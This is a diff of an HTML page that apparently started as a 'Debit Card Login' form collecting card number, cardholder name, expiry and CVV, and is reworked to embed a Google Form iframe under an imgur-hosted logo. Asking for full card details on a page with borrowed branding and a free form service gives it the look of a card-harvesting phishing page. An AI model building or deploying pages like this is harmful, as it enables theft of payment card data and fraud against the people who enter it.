@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Debit Card Login</title>
+  <title>Debit Card Form</title>
   <style>
     body {
       font-family: 'Arial', sans-serif;
@@ -15,99 +15,56 @@
 
     .card {
       width: 420px;
-      padding: 25px;
+      height: 820px; /* adjust height to fit form */
+      padding: 20px;
       background-color: #000000; /* black background */
       border-radius: 20px;
       box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-      color: white;
       display: flex;
       flex-direction: column;
-      gap: 15px;
+      overflow: hidden;
     }
 
-    label {
-      font-weight: bold;
-      font-size: 14px;
-      margin-top: 10px;
-    }
-
-    input {
+    .card iframe {
       width: 100%;
-      padding: 12px 15px;
-      margin-top: 5px;
-      border-radius: 8px;
-      border: none;
-      font-size: 16px;
-      background-color: #111111; /* dark input background */
-      color: white;
-      box-sizing: border-box;
-    }
-
-    .row {
-      display: flex;
-      gap: 10px;
-    }
-
-    .row input {
       flex: 1;
+      border: none;
+      border-radius: 12px;
+      margin-bottom: 15px;
     }
 
-    .submit-bar {
+    .logo-bar {
       display: flex;
-      align-items: center;
       justify-content: center;
-      background-color: #1c1c1c;
-      border-radius: 10px;
+      align-items: center;
+      background-color: #111111;
       padding: 12px;
-      cursor: pointer;
-      transition: 0.3s;
-      margin-top: 15px;
+      border-radius: 10px;
     }
 
-    .submit-bar:hover {
-      background-color: #333333;
+    .logo-bar img {
+      height: 36px;
+      width: auto;
     }
 
-    .submit-bar img {
-      height: 24px;
-      width: 24px;
-      margin-right: 12px;
-    }
-
-    .submit-bar span {
-      color: white;
-      font-weight: bold;
-      font-size: 16px;
-    }
   </style>
 </head>
 <body>
 
 <div class="card">
-  <form>
-    <label>Card Number</label>
-    <input type="text" placeholder="XXXX XXXX XXXX XXXX" maxlength="19">
+  <!-- Embed Google Form -->
+  <iframe 
+    src="https://docs.google.com/forms/d/e/1FAIpQLSeLOQkeADnMfApi9CY7nVq9wf-mj8Ljsm8VLbbjIO6Rg0y3AQ/viewform?embedded=true"
+    frameborder="0"
+    marginheight="0"
+    marginwidth="0">
+    Loading…
+  </iframe>
 
-    <label>Cardholder Name</label>
-    <input type="text" placeholder="John Doe">
-
-    <div class="row">
-      <div>
-        <label>Exp Date</label>
-        <input type="text" placeholder="MM/YY" maxlength="5">
-      </div>
-      <div>
-        <label>CVV</label>
-        <input type="text" placeholder="XXX" maxlength="3">
-      </div>
-    </div>
-
-    <!-- Submit bar with new logo -->
-    <div class="submit-bar">
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTgxjRBw2pPAYVpT72eA6bJXXALbQN7tk5wjw&s" alt="Logo">
-      <span>Submit</span>
-    </div>
-  </form>
+  <!-- Logo bar at the bottom -->
+  <div class="logo-bar">
+    <img src="https://i.imgur.com/igeEdp3g.jpg" alt="Logo">
+  </div>
 </div>
 
 </body>
